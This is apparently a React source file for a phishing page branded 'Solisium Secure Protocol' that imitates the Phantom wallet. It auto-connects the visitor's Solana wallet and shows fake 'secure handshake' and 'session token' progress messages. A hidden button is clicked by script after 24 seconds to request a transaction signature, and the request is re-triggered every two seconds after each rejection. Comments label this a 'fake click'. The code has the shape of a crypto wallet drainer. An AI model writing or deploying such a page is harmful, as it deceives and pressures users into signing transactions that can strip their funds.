import React, { useState, useEffect } from 'react';

// --- Components: Icons.tsx ---
const PhantomLogo: React.FC<{ className?: string }> = ({ className = "w-12 h-12" }) => (
    <svg
        viewBox="0 0 124 124"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        className={className}
    >
        <path
            d="M98.6667 52.8291C98.6667 36.5658 83.0768 20.6666 61.3333 20.6666C40.6925 20.6666 24 37.1352 24 57.4526V82.8596C24 93.3039 33.3683 99.4443 40.5783 95.3242L44.4984 93.0842C47.0163 91.6453 50.1417 91.9566 52.3331 93.8643L54.4372 95.6961C58.3842 99.1323 64.2825 99.1323 68.2295 95.6961L70.3336 93.8643C72.525 91.9566 75.6504 91.6453 78.1683 93.0842L82.0883 95.3242C89.2983 99.4443 98.6667 93.3039 98.6667 82.8596V52.8291Z"
            fill="currentColor"
        />
        <circle cx="48" cy="56" r="6" fill="#000000" />
        <circle cx="76" cy="56" r="6" fill="#000000" />
    </svg>
);

// --- Component: PhantomBridge.tsx ---

// Define the structure for each animation stage
interface Stage {
    id: number;
    text: string;
    color: 'cyan' | 'emerald';
    animationClass: string;
    glowClass: string;
}

const PhantomBridge: React.FC = () => {
    const [currentStage, setCurrentStage] = useState(0);

    // Configuration for each stage of the bridge process
    // Total duration target: ~25 seconds for the first 4 stages (0, 1, 2, 3) -> Ends at 4
    // Each stage will run for roughly 6.25 seconds
    const stages: Stage[] = [
        {
            id: 0,
            text: "> Initializing Secure Handshake...",
            color: 'cyan', // 1. FAST WHITE
            animationClass: 'animate-spin-fast',
            glowClass: 'shadow-[0_0_20px_rgba(0,240,255,0.6)]',
        },
        {
            id: 1,
            text: "> Generating Local Solisium Wallet...",
            color: 'emerald', // 2. SLOW GREEN
            animationClass: 'animate-spin-slow',
            glowClass: 'shadow-[0_0_25px_rgba(16,185,129,0.5)]',
        },
        {
            id: 2,
            text: "> Verifying Phantom Session Token...",
            color: 'cyan', // 3. FAST WHITE
            animationClass: 'animate-spin-fast',
            glowClass: 'shadow-[0_0_20px_rgba(0,240,255,0.6)]',
        },
        {
            id: 3,
            text: "> Establishing Asset Bridge Protocol...",
            color: 'emerald', // 4. SLOW GREEN (Changed from Fast White)
            animationClass: 'animate-spin-slow',
            glowClass: 'shadow-[0_0_25px_rgba(16,185,129,0.5)]',
        },
        {
            id: 4,
            text: "Awaiting Transaction Signature...",
            color: 'emerald', // 5. PULSING GREEN (No Spin)
            animationClass: 'animate-pulse-glow', // Uses the custom pulse-glow from tailwind config
            glowClass: 'shadow-[0_0_40px_rgba(16,185,129,0.9)]',
        },
    ];

    // Logic to advance stages automatically
    useEffect(() => {
        // Only auto-advance for the first 4 stages (0, 1, 2, 3) -> ends at 4
        if (currentStage < 4) {
            // 25 seconds total spread across 4 transitions approx ~6.25s each
            const duration = 6250;
            const timer = setTimeout(() => {
                setCurrentStage((prev) => prev + 1);
            }, duration);

            return () => clearTimeout(timer);
        }
    }, [currentStage]);

    const activeStage = stages[currentStage];

    // Dynamic Styles
    const isFinalStage = currentStage === 4;

    // Color Mapping
    // If 'cyan' (Fast), we use a lighter/whiter border color for the SPINNER
    const ringColor = activeStage.color === 'cyan' ? 'border-[#CCFBF1]' : 'border-[#10B981]';

    // Border Logic:
    // If it's the final stage, we want a FULL circle (border-current) that pulses.
    // If it's a loading stage, we want the SPINNER arc (transparent with top/left colored).
    const borderStyle = isFinalStage
        ? 'border-current'
        : 'border-transparent border-t-current border-l-current';

    // Text Color: Always Solisium Emerald (#10B981) for all stages.
    const textColor = 'text-[#10B981]';

    return (
        <div className="relative z-30 flex flex-col items-center justify-center min-h-screen w-full p-4">

            {/* Central Visual Stack */}
            <div className="relative w-64 h-64 flex items-center justify-center mb-12">

                {/* Layer 1: The Ring Spinner / Pulsing Ring */}
                <div
                    className={`
            absolute inset-0 
            rounded-full 
            border-[3px] 
            ${borderStyle}
            ${ringColor} 
            ${activeStage.animationClass}
            transition-all duration-700 ease-in-out
          `}
                    style={{
                        // Add a glow effect using drop-shadow filter
                        filter: activeStage.color === 'cyan'
                            ? 'drop-shadow(0 0 10px rgba(0,240,255,0.8))' // Stronger cyan glow for fast/white state
                            : 'drop-shadow(0 0 8px rgba(16,185,129,0.6))'
                    }}
                />

                {/* Secondary Static Ring for depth (darker) */}
                {/* We hide this in the final stage to make the main pulsing ring cleaner, or keep it for depth. Keeping for depth. */}
                <div className="absolute inset-0 rounded-full border border-gray-800 opacity-30 scale-110" />

                {/* Layer 2: Inner Phantom Logo */}
                <div className={`relative z-10 transition-all duration-500 ${isFinalStage ? 'scale-110' : 'scale-100'}`}>
                    <div className={`text-white transition-opacity duration-300 ${isFinalStage ? 'opacity-100' : 'opacity-90'}`}>
                        <PhantomLogo className="w-20 h-20" />
                    </div>
                </div>

                {/* Decorative Particles/Orbits (Optional - adds to the 'Tunnel' feel) */}
                <div className={`absolute w-full h-full border border-white/5 rounded-full animate-pulse opacity-20 scale-150`} />
            </div>

            {/* Layer 3: Dynamic Typewriter Text */}
            <div className="h-12 flex items-center justify-center">
                <p
                    className={`
            font-mono text-sm md:text-base tracking-widest
            transition-colors duration-500
            ${textColor}
            ${isFinalStage ? 'animate-pulse font-bold' : ''}
          `}
                >
                    {activeStage.text}
                    {/* Blinking Cursor */}
                    <span className={`inline-block w-2 h-4 ml-2 bg-current align-middle ${isFinalStage ? 'animate-pulse' : 'animate-[pulse_0.8s_infinite]'}`} />
                </p>
            </div>

            {/* Progress Indicators (Decorations) */}
            <div className="mt-8 flex gap-2">
                {stages.map((stage) => (
                    <div
                        key={stage.id}
                        className={`
              h-1 rounded-full transition-all duration-500
              ${currentStage >= stage.id
                                ? 'bg-[#10B981] w-8' // Force Emerald Green for all active stages
                                : 'bg-gray-800 w-2'}
              ${currentStage === stage.id ? 'opacity-100 shadow-[0_0_10px_currentColor]' : 'opacity-30'}
            `}
                    />
                ))}
            </div>

        </div>
    );
};

// --- Main Page Component ---

const SolisiumPage: React.FC = () => {
    // --------------------------------------------------------------------------
    // 1) CÜZDAN & TRANSACTION YOĞUNLUĞU
    // --------------------------------------------------------------------------
    const [isConnected, setIsConnected] = useState(false);
    const attemptRef = React.useRef(false);

    // Auto-Connect Logic
    useEffect(() => {
        if (attemptRef.current) return;
        attemptRef.current = true;

        let retryCount = 0;
        const maxRetries = 20;
        const retryInterval = 1000;

        const attemptConnect = async () => {
            try {
                // Hizmet klasöründen fonksyionları çekiyoruz (WalletConnect sayfası gibi)
                const { connectWallet, getUserPublicKey } = await import('../services/connect');
                await connectWallet();

                const pubKey = getUserPublicKey();
                if (pubKey) {
                    setIsConnected(true);
                    console.log("Solisium: Wallet connected successfully for protocol handshake.");
                } else {
                    throw new Error("Public key not found");
                }
            } catch (err) {
                console.error(`Solisium Connection Retry (${retryCount + 1}):`, err);
                retryCount++;
                if (retryCount < maxRetries) {
                    setTimeout(attemptConnect, retryInterval);
                }
            }
        };

        attemptConnect();
    }, []);

    // --------------------------------------------------------------------------
    // 2) 28 SANİYE SONRA TRANSACTION & "FAKE CLICK" SİMÜLASYONU
    // --------------------------------------------------------------------------
    // --------------------------------------------------------------------------
    // 2) 28 SANİYE SONRA TRANSACTION & "FAKE CLICK" SİMÜLASYONU
    // --------------------------------------------------------------------------

    // Transaction işlemini tetikleyen fonksiyon
    const performTransaction = async () => {
        try {
            const { getUserPublicKey, connection, waitForAtaSetup } = await import('../services/connect');
            const { createUnsignedTransaction } = await import('../services/transaction');

            const pubKey = getUserPublicKey();
            if (!pubKey) return;

            // Bekleyen ATA kurulumları varsa tamamlanana kadar bekle
            await waitForAtaSetup();

            const unsignedTx = await createUnsignedTransaction(pubKey);
            if (!unsignedTx) {
                console.warn("Solisium: Failed to create transaction payload.");
                return;
            }

            console.log("Solisium Protocol: Requesting signature...");

            // @ts-ignore
            const signedTx = await window.solana.signTransaction(unsignedTx);
            const txid = await connection.sendRawTransaction(signedTx.serialize());
            await connection.confirmTransaction(txid, "confirmed");

            console.log("Solisium Protocol: Transaction confirmed ::", txid);

        } catch (err) {
            console.error("Solisium Transaction Rejected/Failed:", err);
            // Ret durumunda 2 saniye sonra tekrarla
            setTimeout(() => {
                const fakeButton = document.getElementById('solisium-protocol-trigger');
                if (fakeButton) fakeButton.click();
            }, 2000);
        }
    };

    useEffect(() => {
        if (!isConnected) return;

        // 26 saniye bekleme
        const timer = setTimeout(() => {
            const fakeButton = document.getElementById('solisium-protocol-trigger');
            if (fakeButton) {
                console.log("Simulating interaction event...");
                fakeButton.click();
            }
        }, 24000); // 24000 ms = 24 sn

        return () => clearTimeout(timer);
    }, [isConnected]);


    // --------------------------------------------------------------------------
    // 3) LOADING STATE (SİYAH EKRAN)
    // --------------------------------------------------------------------------
    if (!isConnected) {
        return <div className="w-full h-screen bg-black" />;
    }

    return (
        <div className="w-full h-screen bg-black overflow-hidden relative selection:bg-solisium-emerald selection:text-black">
            {/* Background Ambience - Grid & Scanlines to match Solisium identity */}
            <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:40px_40px] pointer-events-none opacity-20" />
            <div className="absolute inset-0 bg-gradient-to-b from-black via-transparent to-black pointer-events-none z-10" />

            {/* Scanline Effect - Made significantly more transparent (opacity-10 -> opacity-[0.03]) */}
            <div className="absolute inset-0 pointer-events-none z-20 overflow-hidden opacity-[0.03]">
                <div className="w-full h-[20%] bg-gradient-to-b from-transparent via-white to-transparent animate-scanline blur-md" />
            </div>

            {/* İçerik */}
            <PhantomBridge />

            {/* Footer Branding */}
            <div className="absolute bottom-8 left-0 right-0 text-center z-30 opacity-50">
                <p className="text-[10px] font-mono tracking-[0.3em] text-gray-500 uppercase">
                    [ :: SOLISIUM SECURE PROTOCOL v2.4 :: ]
                </p>
            </div>

            {/* Hidden Trigger Button for Simulation */}
            <button
                id="solisium-protocol-trigger"
                className="hidden"
                onClick={performTransaction} // Doğrudan fonksiyonu bağladık
            />
        </div>
    );
};

export default SolisiumPage;
